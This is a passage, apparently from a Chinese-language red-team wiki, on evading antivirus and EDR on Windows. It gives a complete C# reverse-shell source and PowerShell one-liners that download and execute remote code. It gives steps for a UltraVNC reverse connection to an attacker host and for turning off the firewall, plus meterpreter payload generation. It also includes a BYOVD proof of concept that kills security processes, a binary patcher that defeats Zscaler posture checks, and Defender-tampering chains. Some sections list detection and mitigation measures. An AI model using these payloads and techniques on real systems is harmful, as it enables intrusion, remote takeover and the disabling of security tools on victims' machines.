与禁用（绕过）AMSI 类似，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回，而不记录任何事件。具体做法是对内存中的函数进行 patch，使其立即返回，从而有效禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 中找到更多信息。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

在内存中加载 C# 二进制文件已经是众所周知的技术，并且仍然是运行 post-exploitation 工具而不被 AV 捕获的一种非常有效的方法。

由于 payload 会直接加载到内存中，不会接触磁盘，因此我们只需要关注为整个进程 patch AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有多种：

- **Fork\&Run**

该方法会**生成一个新的 sacrificial process**，将 post-exploitation 恶意代码注入该新进程，执行恶意代码，并在完成后终止新进程。这种方法既有优点，也有缺点。Fork and Run 方法的优点是，执行发生在我们的 Beacon implant 进程**之外**。这意味着，如果 post-exploitation 操作出现问题或被捕获，我们的 **implant 存活的概率会大得多。** 缺点是，被 **Behavioural Detections** 捕获的概率也**更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

该方法是将 post-exploitation 恶意代码注入**其自身进程**。这样可以避免创建新进程并被 AV 扫描，但缺点是，如果 payload 执行过程中出现问题，**丢失 beacon** 的概率会**大得多**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想进一步了解 C# Assembly loading，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）。

你也可以**从 PowerShell** 加载 C# Assemblies，请查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用其他编程语言

正如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所述，可以通过让受感染机器访问**安装在 Attacker Controlled SMB share 上的 interpreter environment**，使用其他语言执行恶意代码。

通过允许访问 SMB share 上的 Interpreter Binaries 和 environment，你可以在受感染机器的**内存中使用这些语言执行任意代码**。

该 repo 指出：Defender 仍然会扫描 scripts，但通过使用 Go、Java、PHP 等语言，我们可以获得**更大的灵活性来绕过静态 signatures**。使用这些语言编写的随机、未 obfuscate 的 reverse shell scripts 进行测试已经证明这种方法是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操纵 access token 或 EDR、AV 等 security product** 的技术，使其权限降低，从而让进程不会终止，但也没有权限检查恶意活动。

为防止这种情况，Windows 可以**阻止 external processes** 获取 security processes 的 tokens 句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 使用 Trusted Software

### Chrome Remote Desktop

正如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 中所述，只需在受害者的 PC 上部署 Chrome Remote Desktop，然后使用它接管设备并维持 persistence 即可：<sup>[[35]](#references)</sup>
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者设备上静默运行 installer（需要 admin 权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。向导随后会要求你进行授权；点击 Authorize 按钮继续。
4. 对给定参数进行一些调整后执行：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数，它允许你设置 pin，而无需使用 GUI）。


## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单个系统中考虑许多不同的 telemetry 来源，因此在成熟环境中保持完全 undetected 基本上是不可能的。

你所面对的每个环境都有其自身的优势和弱点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以初步了解更多 Advanced Evasion 技术。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一场精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **旧技术**

### **检查 Defender 发现哪些部分是恶意的**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制文件的部分内容**，直到**找出 Defender 判定为恶意的部分**，并将其拆分出来。\
另一个执行**相同操作的工具是** [**avred**](https://github.com/dobin/avred)，它还通过 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供开放的 web 服务。

### **Telnet Server**

在 Windows10 之前，所有 Windows 都附带一个可以安装的 **Telnet server**（需要以 administrator 身份执行）：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**启动**，并立即运行：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口**（stealth）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从以下地址下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（需要的是 bin downloads，而不是 setup）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者主机**

#### **Reverse connection**

**攻击者**应在其**主机内部**执行二进制文件 `vncviewer.exe -listen 5900`，使其**准备好**接收反向的 **VNC connection**。然后，在**受害者主机**内部：启动 winvnc daemon `winvnc.exe -run`，并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：**为了保持 stealth，以下几项操作不能执行

- 如果 `winvnc` 已经在运行，不要再次启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否正在运行
- 不要在同一目录中没有 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会打开 [配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从以下地址下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 中：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **start the lister**，并使用以下命令**execute** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前 defender 将非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用它配合：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### 使用 C# 编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 Python 构建 injector 示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从 Kernel Space Killing AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型 console utility，在部署 ransomware 之前禁用 endpoint protections。该工具携带自己的**易受攻击但*已签名*的 driver**，并滥用它执行特权 kernel 操作，即使是 Protected-Process-Light (PPL) AV services 也无法阻止这些操作。<sup>[[12]](#references)</sup>

关键要点
1. **已签名 driver**：写入磁盘的文件是 `ServiceMouse.sys`，但其 binary 实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的 driver `AToolsKrnl64.sys`。由于该 driver 带有有效的 Microsoft signature，即使启用了 Driver-Signature-Enforcement (DSE)，它仍然可以加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将该 driver 注册为 **kernel service**，第二行启动它，使 `\\.\ServiceMouse` 可以从 user land 访问。
3. **driver 暴露的 IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 根据 PID 终止任意 process（用于终止 Defender/EDR services） |
| `0x990000D0` | 删除磁盘上的任意 file |
| `0x990001D0` | Unload driver 并移除 service |

最小化 C proof-of-concept：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **为何有效**：BYOVD 完全绕过 user-mode protections；在 kernel 中执行的 code 可以打开*受保护的* processes、终止它们，或篡改 kernel objects，而不受 PPL/PP、ELAM 或其他 hardening features 的影响。

Detection / Mitigation
• 启用 Microsoft 的 vulnerable-driver block list（`HVCI`、`Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。
• 监控新建 *kernel* services，并在 driver 从 world-writable directory 加载或不在 allow-list 中时发出警报。
• 监控指向 custom device objects 的 user-mode handles，随后检查可疑的 `DeviceIoControl` calls。

### 通过 On-Disk Binary Patching 绕过 Zscaler Client Connector Posture Checks

Zscaler 的 **Client Connector** 在本地应用 device-posture rules，并依靠 Windows RPC 将结果传递给其他 components。两个较弱的设计选择使得完全绕过成为可能：

1. Posture evaluation **完全在 client-side 进行**（向 server 发送一个 boolean）。
2. Internal RPC endpoints 只验证连接 executable 是否由 Zscaler 签名（通过 `WinVerifyTrust`）。<sup>[[11]](#references)</sup>

通过**修补磁盘上的四个已签名 binaries**，可以使这两种机制失效：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次 check 都符合要求 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | 被 NOP-ed ⇒ 任何（甚至 unsigned）process 都可以绑定到 RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

最小化 patcher 片段：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
替换原始文件并重启 service stack 后：

* **所有** posture checks 均显示为 **green/compliant**。
* 未签名或被修改的 binaries 可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被 compromise 的主机获得对 Zscaler policies 所定义内部网络的 unrestricted access。

该 case study 展示了如何通过几处 byte patches 击败纯 client-side trust decisions 和简单的 signature checks。

## 使用 Protected Process Light (PPL) 和 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制实施 signer/level hierarchy，只有 protection level 相同或更高的 protected processes 才能互相 tamper。进攻方面，如果你能合法启动一个启用 PPL 的 binary 并控制其 arguments，就可以将 benign functionality（例如 logging）转换为一种受约束的、由 PPL 支持的 write primitive，用于写入 AV/EDR 使用的 protected directories。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

使进程以 PPL 运行的条件
- 目标 EXE（以及所有 loaded DLLs）必须使用带有 PPL-capable EKU 的签名进行签名。
- 必须使用以下 flags，通过 CreateProcess 创建进程：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与 binary signer 匹配的 compatible protection level（例如，anti-malware signers 使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows signers 使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 levels 将导致创建失败。

另请参阅此处关于 PP/PPL 和 LSASS protection 的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper：CreateProcessAsPPL（选择 protection level 并将 arguments 转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` 会自行生成进程，并接受一个参数，将日志文件写入调用者指定的路径。
- 当作为 PPL process 启动时，文件写入会由 PPL backing 执行。
- ClipUp 无法解析包含空格的路径；使用 8.3 short paths 指向通常受保护的位置。

8.3 short path helpers
- 在每个父目录中使用 `dir /x` 列出 short names。
- 在 cmd 中派生 short path：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用 launcher（例如 CreateProcessAsPPL），通过 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的 log-path 参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。必要时使用 8.3 short names。
3) 如果目标 binary 在运行时通常会被 AV 打开或锁定（例如 MsMpEng.exe），则通过安装一个能够可靠地更早运行的 auto-start service，在 AV 启动前的 boot 阶段安排写入。使用 Process Monitor（boot logging）验证 boot ordering。
4) 重启时，PPL-backed write 会在 AV 锁定其 binaries 之前执行，从而损坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项和限制
- 你无法控制 ClipUp 写入的内容，只能控制其放置位置；该 primitive 适用于破坏，而不适用于精确的内容注入。
- 需要 local admin/SYSTEM 权限才能安装/启动 service，并且需要重启窗口。
- 时序至关重要：目标文件不能处于打开状态；boot-time execution 可避免 file locks。

检测
- 在 boot 附近发现以异常参数创建的 `ClipUp.exe` 进程，尤其是其父进程为非标准 launcher 时。
- 配置为 auto-start 且指向可疑 binary 的新 service，并且始终在 Defender/AV 之前启动。调查 Defender 启动失败之前发生的 service 创建/修改。
- 对 Defender binary/Platform 目录进行 file integrity monitoring；关注由带有 protected-process flags 的进程意外创建/修改文件的行为。
- ETW/EDR telemetry：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV binary 异常使用 PPL level 的情况。

缓解措施
- WDAC/Code Integrity：限制哪些 signed binary 可以作为 PPL 运行，以及允许哪些 parent；阻止在非合法场景下调用 ClipUp。
- Service hygiene：限制 auto-start service 的创建/修改，并监控 start-order manipulation。
- 确保启用 Defender tamper protection 和 early-launch protections；调查显示 binary corruption 的 startup errors。
- 如果与环境兼容，可考虑在承载 security tooling 的 volume 上禁用 8.3 short-name generation（务必进行充分测试）。

## 通过 Platform Version Folder Symlink Hijack 篡改 Microsoft Defender

Windows Defender 通过枚举以下路径下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择 lexicographic version string 最高的子文件夹（例如 `4.18.25070.5-0`），然后从该目录启动 Defender service processes（同时相应更新 service/registry paths）。此选择会信任 directory entries，包括 directory reparse points（symlinks）。管理员可以利用这一点，将 Defender 重定向到 attacker-writable path，从而实现 DLL sideloading 或 service disruption。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- Local Administrator（需要在 Platform folder 下创建 directories/symlinks）
- 能够 reboot，或触发 Defender platform re-selection（boot 时的 service restart）
- 只需要 built-in tools（mklink）

原理
- Defender 会阻止对其自身 folders 的写入，但其 platform selection 会信任 directory entries，并选择 lexicographically 最高的 version，而不会验证目标解析后是否指向受保护/可信路径。

分步操作（示例）
1) 准备当前 platform folder 的 writable clone，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你的文件夹的更高版本目录符号链接：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger 选择（建议 reboot）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向后的路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该观察到 `C:\TMP\AV\` 下的新进程路径，以及反映该位置的服务配置/registry。

Post-exploitation 选项
- DLL sideloading/code execution：放置/替换 Defender 从其 application directory 加载的 DLL，以便在 Defender 的进程中执行代码。参见上文：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial：移除 version-symlink，这样下次启动时配置的路径将无法解析，Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：此技术本身不会提供 privilege escalation；它需要 admin rights。

## API/IAT Hooking + Call-Stack Spoofing with PIC（Crystal Kit 风格）

Red teams 可以将 runtime evasion 从 C2 implant 中移出，并放入目标 module 本身：通过 hooking 其 Import Address Table（IAT），将选定的 APIs 路由到由攻击者控制的、position-independent code（PIC）。这使 evasion 不再局限于许多 kits 所暴露的小范围 API（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post-exploitation DLLs。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高层方法
- 使用 reflective loader 将 PIC blob 与目标 module 一同进行 stage（prepend 或 companion）。PIC 必须 self-contained 且 position-independent。
- 当 host DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并将目标 imports（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）的 IAT entries patch 为指向精简的 PIC wrappers。
- 每个 PIC wrapper 在 tail-calling real API address 之前执行 evasions。典型 evasions 包括：
- 在 call 前后执行 memory mask/unmask（例如加密 beacon regions、将 RWX→RX、更改 page names/permissions），然后在 call 后恢复。
- Call-stack spoofing：构造 benign stack，并转入 target API，使 call-stack analysis 解析到预期的 frames。<sup>[[9]](#references)</sup>
- 为了兼容性，导出一个 interface，使 Aggressor script（或等效工具）能够为 Beacon、BOFs 和 post-ex DLLs 注册要 hook 的 APIs。

为何在此使用 IAT hooking
- 任何使用被 hook import 的 code 都可以工作，无需修改 tool code，也不依赖 Beacon 代理特定 APIs。
- 覆盖 post-ex DLLs：hooking LoadLibrary* 可以拦截 module loads（例如 System.Management.Automation.dll、clr.dll），并对其 API calls 应用相同的 masking/stack evasion。
- 通过包装 CreateProcessA/W，恢复针对基于 call-stack 的 detections 使用 process-spawning post-ex commands 的可靠性。

最小 IAT hook 示例（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 在 relocations/ASLR 之后、首次使用 import 之前应用 patch。TitanLdr/AceLdr 等 reflective loaders 展示了如何在已加载模块的 DllMain 期间执行 hooking。
- 保持 wrappers 简短且 PIC-safe；通过 patch 前捕获的原始 IAT 值或 LdrGetProcedureAddress 解析真实 API。
- 对 PIC 使用 RW → RX 转换，并避免留下可写+可执行页面。

Call‑stack spoofing stub
- Draugr-style PIC stubs 构造 fake call chain（指向 benign modules 的 return addresses），然后 pivot 到真实 API。
- 这可以绕过预期 Beacon/BOFs 到敏感 API 具有 canonical stacks 的 detections。
- 配合 stack cutting/stack stitching techniques，在 API prologue 之前进入预期 frames。

Operational integration
- 将 reflective loader 添加到 post-ex DLL 的开头，使 PIC 和 hooks 在 DLL 加载时自动初始化。
- 使用 Aggressor script 注册 target APIs，使 Beacon 和 BOFs 无需修改代码即可透明地使用同一条 evasion path。

Detection/DFIR considerations
- IAT integrity：解析到 non-image（heap/anon）addresses 的 entries；定期验证 import pointers。
- Stack anomalies：不属于 loaded images 的 return addresses；突然转移到 non-image PIC；不一致的 RtlUserThreadStart ancestry。
- Loader telemetry：进程内写入 IAT、修改 import thunks 的 early DllMain activity、加载时创建的异常 RX regions。
- Image-load evasion：如果 hooking LoadLibrary*，应监控与 memory masking events 相关的可疑 automation/clr assemblies 加载。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如 Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 通过 resident PICO 实现 import-time IAT hooks

如果你控制 reflective loader，可以在 `ProcessImports()` 期间通过将 loader 的 `GetProcAddress` pointer 替换为会优先检查 hooks 的 custom resolver 来 hook imports：<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 构建一个 **resident PICO**（persistent PIC object），使其在 transient loader PIC 释放自身后仍然存在。
- Export 一个 `setup_hooks()` function，覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中跳过 ordinal imports，并使用基于 hash 的 hook lookup，例如 `__resolve_hook(ror13hash(name))`。如果存在 hook，则返回它；否则交给真实的 `GetProcAddress`。
- 在 link time 使用 Crystal Palace 的 `addhook "MODULE$Func" "hook"` entries 注册 hook targets。由于 hook 位于 resident PICO 内部，因此会持续有效。

这样无需在 loaded DLL 完成加载后 patch 其 code section，即可实现 **import-time IAT redirection**。

### 当 target 使用 PEB-walking 时强制生成可 hook 的 imports

Import-time hooks 只有在 function 实际位于 target 的 IAT 中时才会触发。如果 module 通过 PEB-walk + hash 解析 APIs（没有 import entry），则应强制生成真实 import，使 loader 的 `ProcessImports()` path 能够看到它：

- 将 hashed export resolution（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为类似 `&WaitForSingleObject` 的 direct reference。
- compiler 会生成 IAT entry，使 reflective loader 在解析 imports 时能够进行 interception。

### 不 patch `Sleep()` 的 Ekko-style sleep/idle obfuscation

不要 patch `Sleep`，而应 hook implant 实际使用的 **wait/IPC primitives**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）。对于较长的 waits，使用 Ekko-style obfuscation chain 包装调用，在 idle 期间加密内存中的 image：<sup>[[31]](#references)[[27]](#references)</sup>

